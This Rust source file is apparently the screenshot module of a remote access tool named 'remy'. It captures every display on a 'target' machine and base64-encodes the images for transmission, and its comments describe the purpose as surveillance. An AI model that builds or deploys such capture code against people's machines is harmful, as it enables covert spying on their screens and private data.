/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! Screen capture functionality.
//!
//! Captures screenshots of the target's display(s) and returns
//! them as base64-encoded PNG images. Useful for surveillance
//! and verifying command results.

use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use screenshots::Screen;
use std::io::Cursor;

/// Captures a screenshot of the primary display.
///
/// Takes a screenshot using the native screen capture APIs
/// and encodes it as a PNG in base64 format for transmission.
///
/// # Returns
/// Base64-encoded PNG image data, or error message
///
/// # Platform Support
/// Works on Windows, Linux (X11), and macOS.
/// Linux requires X11 display server (Wayland not supported).
pub fn take_screenshot() -> Result<String, String> {
    // Get all available screens
    let screens = Screen::all().map_err(|e| format!("Failed to enumerate screens: {}", e))?;

    if screens.is_empty() {
        return Err("No screens found".to_string());
    }

    // Capture the primary screen (first one)
    let screen = &screens[0];
    let image = screen
        .capture()
        .map_err(|e| format!("Failed to capture screen: {}", e))?;

    // Convert to PNG bytes
    let mut png_data = Vec::new();
    let mut cursor = Cursor::new(&mut png_data);

    image
        .write_to(&mut cursor, image::ImageFormat::Png)
        .map_err(|e| format!("Failed to encode PNG: {}", e))?;

    // Encode as base64
    Ok(BASE64.encode(png_data))
}

/// Captures screenshots of all displays.
///
/// Returns a vector of base64-encoded PNG images, one per display.
/// Useful for multi-monitor setups.
///
/// # Returns
/// Vector of (screen_index, base64_png) tuples
pub fn take_all_screenshots() -> Result<Vec<(usize, String)>, String> {
    let screens = Screen::all().map_err(|e| format!("Failed to enumerate screens: {}", e))?;

    let mut results = Vec::new();

    for (idx, screen) in screens.iter().enumerate() {
        match screen.capture() {
            Ok(image) => {
                let mut png_data = Vec::new();
                let mut cursor = Cursor::new(&mut png_data);

                if image
                    .write_to(&mut cursor, image::ImageFormat::Png)
                    .is_ok()
                {
                    results.push((idx, BASE64.encode(png_data)));
                }
            }
            Err(_) => {
                // Skip failed screens, continue with others
                continue;
            }
        }
    }

    if results.is_empty() {
        Err("Failed to capture any screens".to_string())
    } else {
        Ok(results)
    }
}
